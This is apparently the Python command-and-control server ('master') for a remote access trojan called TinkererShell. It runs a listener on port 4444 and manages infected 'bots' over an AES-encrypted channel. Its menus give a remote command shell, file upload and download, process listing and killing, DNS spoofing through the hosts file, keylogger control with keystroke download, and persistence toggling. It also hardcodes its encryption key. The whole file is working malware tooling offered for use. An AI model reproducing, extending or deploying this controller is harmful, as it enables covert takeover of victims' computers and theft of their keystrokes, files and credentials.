#!/usr/bin/python
# -*- coding: utf-8 -*-
"""TinkererShell master, a simple bots manager.\n"""

# Written By Ananke: https://github.com/4n4nk3
from socket import *
from sys import exit
import os
import time
import base64
import cmd
import threading
import datetime
from random import randrange
# pycrypto
from Crypto.Cipher import AES

# Global variables
global conn
global cipher
global EncodeAES
global DecodeAES
global connected_sockets
global active_bot

connected_sockets = []
active_bot = 1000


def connection_gate():
    host = ''
    port = 4444
    # Socket definition
    s = socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind((host, port))
    logging(data_to_log='\nWelcome in TinkererShell!\nWritten By 4n4nk3: https://github.com/4n4nk3\n', printer=True)
    logging(data_to_log=('Listening on 0.0.0.0:%s...' % str(port)), printer=True)

    # Listening...
    s.listen(10)
    while True:
        so = s
        conn_gate, addr = so.accept()
        lengthcrypt = conn_gate.recv(1024)
        expected_length = int(DecodeAES(cipher, lengthcrypt))
        encrypted_received_data: str = ''
        while len(encrypted_received_data) < expected_length:
            encrypted_received_data += conn_gate.recv(1024).decode('utf-8')
        clear_text = DecodeAES(cipher, encrypted_received_data)
        logging(data_to_log=('Connection established with: ' + str(addr).split('\'')[1]), printer=True)
        while True:
            new_port = randrange(5000, 6000)
            try:
                new_so = socket(AF_INET, SOCK_STREAM)
                new_so.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
                new_so.bind((host, new_port))
                encrypted = EncodeAES(cipher, str(new_port))
                # Send encrypted data's length encrypted
                conn_gate.send(EncodeAES(cipher, str(len(encrypted))))
                # Sleep 1 second to let the receiver decrypt the length packet.
                time.sleep(1)
                # Send encrypted data
                conn_gate.send(encrypted)
                threading.Thread(target=handler, args=(new_so, new_port, clear_text)).start()
                break
            except os.error as exception_gate:
                if exception_gate.errno == 98:
                    print("Port is already in use")
                else:
                    print(exception_gate)


def handler(new_so, new_port, username):
    global connected_sockets
    global active_bot
    new_so.listen(10)
    conn_handler, addr = new_so.accept()
    lengthcrypt = conn_handler.recv(1024)
    expected_length = int(DecodeAES(cipher, lengthcrypt))
    encrypted_received_data: str = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += conn_handler.recv(1024).decode('utf-8')
    a = DecodeAES(cipher, encrypted_received_data)
    if a == username:
        logging(data_to_log=('Connection consolidated with: {}\t{}'.format(str(addr).split('\'')[1], username)),
                printer=True)
        connected_sockets.append(
            {'conn': conn_handler, 'port': new_port, 'ip': str(addr).split('\'')[1], 'username': username,
             'status': True})
        position = len(connected_sockets) - 1
        while True:
            if position != active_bot:
                encrypted = EncodeAES(cipher, 'KeepAlive')
                # Send encrypted data's length encrypted
                conn_handler.send(EncodeAES(cipher, str(len(encrypted))))
                # Sleep 1 second to let the receiver decrypt the length packet.
                time.sleep(1)
                # Send encrypted data
                conn_handler.send(encrypted)
            time.sleep(60)
    conn_handler.close()


def logging(data_to_log: str, printer=False) -> bool:
    """Log data passed as argument and if needed print it also to the console.\n"""
    if printer is True:
        print(data_to_log)
    try:
        log_descriptor = open('sessionlog.txt', 'a')
        log_descriptor.write('\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n' + data_to_log)
        log_descriptor.close()
    except Exception as exception_logging:
        print(exception_logging)
    return True


def sender(data_to_send: str) -> bool:
    """Send a string to the connected bot. Make sure string is not empty in order to prevent reception exceptions.\n"""
    if len(data_to_send) == 0:
        data_to_send = 'Ok (no output)'
    # Encrypt data
    encrypted = EncodeAES(cipher, data_to_send)
    # Send encrypted data's length encrypted
    conn.send(EncodeAES(cipher, str(len(encrypted))))
    # Sleep 1 second to let the receiver decrypt the length packet.
    time.sleep(1)
    # Send encrypted data
    conn.send(encrypted)
    return True


def receiver(printer=False) -> str:
    """Receive encrypted data and return clear-text string.\n"""
    lengthcrypt = conn.recv(1024)
    expected_length = int(DecodeAES(cipher, lengthcrypt))
    encrypted_received_data: str = ''
    while len(encrypted_received_data) < expected_length:
        encrypted_received_data += conn.recv(1024).decode('utf-8')
    clear_text = DecodeAES(cipher, encrypted_received_data)
    if printer is True:
        logging(data_to_log=clear_text, printer=True)
    return clear_text


def ask_input(phrase: object = False, send: bool = False) -> str:
    """Ask for user input with custom phrase or default to >>>. If needed send input to connected bot.\n"""
    if phrase:
        user_input = input(phrase)
        logging(data_to_log=(''.join((phrase, user_input))))
        if send is True:
            sender(user_input)
    else:
        user_input = input('>>> ')
        logging(data_to_log=('>>> ' + user_input))
        if send is True:
            sender(user_input)
    return user_input


def downloader() -> bool:
    """Download a file from the bot.\n"""
    sender('SHdownload')
    # File to be downloaded
    receiver(printer=True)
    ask_input(send=True)
    received_file_data = receiver()
    # Local filename to save downloaded file
    local_filename = ask_input(phrase='Insert name which you want to use to save the file\t\texample.txt\n\n >>> ')
    # sender(a)
    if received_file_data != 'reachedexcept':
        try:
            downloaded_file_descriptor = open(local_filename, 'wb')
            downloaded_file_descriptor.write(bytes(received_file_data))
            downloaded_file_descriptor.close()
            logging(data_to_log=('File saved in ' + os.getcwd() + '\n'), printer=True)
        except Exception as exception_downloader:
            logging(data_to_log=str(exception_downloader), printer=True)
    else:
        remote_exception = receiver()
        logging(
            data_to_log='Operation aborted (received <reachedexcept> string from bot)\nDetails: ' + remote_exception,
            printer=True)
    return True


def uploader() -> bool:
    """Upload a file to the bot.\n"""
    sender('SHupload')
    file_to_upload = ask_input(phrase=('Insert the name of the file that you want to upload\t\t' + os.path.normcase(
        'C:/boot.ini') + '\n\n >>> '))
    ask_input(phrase='Insert name which you want to use to save the file\t\tC:\\boot.ini\n\n >>> ', send=True)
    try:
        upload_descriptor = open(file_to_upload, 'rb')
        file_data = upload_descriptor.read()
        upload_descriptor.close()
    except Exception as exception_uploader:
        logging(data_to_log=str(exception_uploader), printer=True)
        file_data = 'reachedexcept'
    sender(file_data)
    receiver(printer=True)
    return True


def processkiller():
    """Kill a process.\n"""
    sender('SHprocesskill')
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)


def dnsspoofer():
    """Start DNS spoofing via 'hosts' file.\n"""
    sender('SHdnstart')
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)
    ask_input(send=True)
    receiver(printer=True)


def keylogdownloader():
    """Download keystrokes logged by keylogger.\n"""
    sender('SHkeylogdownload')
    keylogged_data = receiver()
    if keylogged_data == 'reachedexcept':
        receiver(printer=True)
    else:
        try:
            keylogged_descriptor = open('keylogged.txt', 'a')
            keylogged_descriptor.write(keylogged_data)
            keylogged_descriptor.close()
            logging(data_to_log='Download completed!\n Use <SHkeylog show> to see keylogged data\n', printer=True)
        except Exception as exception_keylogdownloader:
            logging(data_to_log=str(exception_keylogdownloader), printer=True)


def keylogshower():
    """Show downloaded keystrokes in a tk window.\n"""
    try:
        keylogged_descriptor = open('keylogged.txt', 'r')
        print(keylogged_descriptor.read())
        keylogged_descriptor.close()
    except Exception as exception_keylogshower:
        logging(data_to_log=str(exception_keylogshower), printer=True)


def quit_utility() -> bool:
    """Quit and terminate remote backdoor thread. If mailactivation thread is not running the bot gonna kill himself.\n"""
    global conn
    double_check = ask_input(phrase='Are you sure? yes/no\n')
    if double_check == 'yes':
        for bot in connected_sockets:
            conn = bot['conn']
            sender('SHquit')
            response = receiver()
            if response == 'mistochiudendo':
                return True
            else:
                logging(data_to_log=response, printer=True)
                return False
    else:
        logging(data_to_log='Operation aborted\n', printer=True)
        return False


def command_executer():
    CommandExecutorInput().cmdloop()


def tinkerer_menu():
    TinkererShellInput().cmdloop()


# =================================================================================================

class BotSwitcher(cmd.Cmd):
    """Bots selection handler.\n"""
    global active_bot
    global conn
    global connected_sockets
    prompt = '\n(SHbots) '

    # ---------------------------------------------------------------------------------------------
    def do_SHbots(self, option):
        """SHbots\n\tList connected bots.\n"""
        printable_bots = 'Listing bots...'
        for bots_counter in range(len(connected_sockets)):
            if connected_sockets[bots_counter]['status'] is True:
                printable_bots += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, connected_sockets[bots_counter]['ip'],
                                                                  connected_sockets[bots_counter]['username'])
        logging(data_to_log=printable_bots, printer=True)

    # ---------------------------------------------------------------------------------------------
    def default(self, command):
        global active_bot
        global conn
        global connected_sockets
        if command.isdigit() is True:
            try:
                if connected_sockets[int(command)]['status'] is True:
                    double_check = ask_input(phrase='Are you sure? yes/no\n')
                    if double_check == 'yes':
                        active_bot = int(command)
                        conn = connected_sockets[int(command)]['conn']
                        tinkerer_menu()
                    else:
                        logging(data_to_log='Selection canceled\n', printer=True)
            except Exception as exception_default:
                if str(exception_default) == 'list index out of range':
                    logging(data_to_log='The selected bot does not exist\n', printer=True)
                else:
                    logging(data_to_log=str(exception_default), printer=True)
            else:
                pass
        else:
            pass

    # ---------------------------------------------------------------------------------------------
    def do_SHquit(self, option) -> bool:
        """SHquit\n\tQuit and close the connection\n"""
        if quit_utility() is True:
            return True
        else:
            return False

    def emptyline(self):
        pass

    # =============================================================================================
    def precmd(self, line):
        logging(data_to_log=('\n(Bots) ' + line))
        return cmd.Cmd.precmd(self, line)

    # =============================================================================================
    def postloop(self):
        logging(data_to_log='\nQuitting!', printer=True)


# =================================================================================================

class CommandExecutorInput(cmd.Cmd):
    """Command Executor Input handler.\n"""

    prompt = '\n  >>> '

    # ---------------------------------------------------------------------------------------------
    def do_SHreturn(self, option):
        """SHreturn\n\tReturn to TinkererShell interactive mode.\n"""
        logging(data_to_log='Returning to TinkererShell interactive mode...\n', printer=True)
        return True

    # ---------------------------------------------------------------------------------------------
    def default(self, command):
        sender(command)
        response = receiver()
        if response == 'reachedexcept':
            receiver(printer=True)
        else:
            logging(data_to_log=response, printer=True)

    # =============================================================================================
    def precmd(self, line):
        logging(data_to_log=('\n  >>> ' + line))
        return cmd.Cmd.precmd(self, line)


# =================================================================================================
class TinkererShellInput(cmd.Cmd):
    """TinkererShell.\n"""

    prompt = '\n(SHCmd) '

    # ---------------------------------------------------------------------------------------------
    def do_SHprocess(self, option):
        """SHprocesses [option]\n\tlist: List active processes\n\tkill: Kill an active process\n"""
        if option:
            if option == 'list':
                sender('SHprocesslist')
                receiver(printer=True)
            elif option == 'kill':
                processkiller()
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHdns(self, option):
        """SHdns [option]\n\tstart: Start DNS spoofing\n\tstop: Stop DNS spoofing\n"""
        if option:
            if option == 'start':
                dnsspoofer()
            elif option == 'stop':
                sender('SHdnsstop')
                receiver(printer=True)
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHkeylog(self, option):
        """SHkeylog [option]\n\tstatus: Show status of the keylogger\n\tstart: Start keylogger\n\tstop: Stop keylogger\n\tdownload: Download keylogged data to local machine and delete it from remote bot\n\tshow: Show downloaded keylogged data\n"""
        if option:
            if option == 'status':
                sender('SHkeylogstatus')
                receiver(printer=True)
            elif option == 'start':
                sender('SHkeylogstart')
                receiver(printer=True)
            elif option == 'stop':
                sender('SHkeylogstop')
                receiver(printer=True)
            elif option == 'download':
                keylogdownloader()
            elif option == 'show':
                keylogshower()
            else:
                print('Aborted: unknown option\n')
        else:
            print('Aborted: an option is required\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHdownload(self, option):
        """SHdownload\n\tDownload a file\n"""
        downloader()

    # ---------------------------------------------------------------------------------------------
    def do_SHupload(self, option):
        """SHupload\n\tUpload a file\n"""
        uploader()

    # ---------------------------------------------------------------------------------------------
    def do_SHexec(self, option):
        """SHexec\n\tUse remote system command shell\n"""
        command_executer()

    # ---------------------------------------------------------------------------------------------
    def do_SHpersistence(self, option):
        """"SHpersistence [option]\n\tstatus: Show status of the persistence module\n\tenable: Enable persistence installation\n\tdisable: Disable persistence installation\n"""
        if option == 'enable':
            sender('SHpersistenceenable')
            receiver(printer=True)
        elif option == 'disable':
            sender('SHpersistencedisable')
            receiver(printer=True)
        elif option == 'status':
            sender('SHpersistencestatus')
            receiver(printer=True)
        else:
            print('Aborted: unknown option\n')

    # ---------------------------------------------------------------------------------------------
    def do_SHreturn(self, option):
        """SHreturn\n\tReturn to TinkererShell bot selection mode.\n"""
        logging(data_to_log='Returning to TinkererShell bot selection mode...\n', printer=True)
        return True

    # ---------------------------------------------------------------------------------------------
    def emptyline(self):
        pass

    # =============================================================================================
    def precmd(self, line):
        logging(data_to_log=('\n(Cmd) ' + line))
        return cmd.Cmd.precmd(self, line)


# =============================================================================================#=============================================================================================
if __name__ == '__main__':
    """Main function.\n"""

    # Setup sessionlog.txt file where I am gonna log all console output
    if os.path.isfile('sessionlog.txt') and not os.access('sessionlog.txt', os.W_OK):
        chiusura = input(
            '[-] sessionlog.txt access to log file denied.\nTry running this program as root... Press Enter to '
            'exit...')
        exit(0)
    try:
        f = open('sessionlog.txt', 'a')
        f.write(
            '\n\n\n\n\n' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + '\n[*] Start of session\'s logs [*]\n')
        f.close()
    except Exception as exception:
        print(exception)

    # Cryptography
    BLOCK_SIZE = 32
    PADDING = '{'
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).decode('utf-8').rstrip(PADDING)
    # Super secret password
    secret = '4n4nk353hlli5w311d0n3andI1ik3it!'
    cipher = AES.new(secret)
    del secret

    threading.Thread(target=connection_gate).start()

    time.sleep(5)
    # Start command loop
    BotSwitcher().cmdloop()

# TODO: Kill all reamining threads when user quit
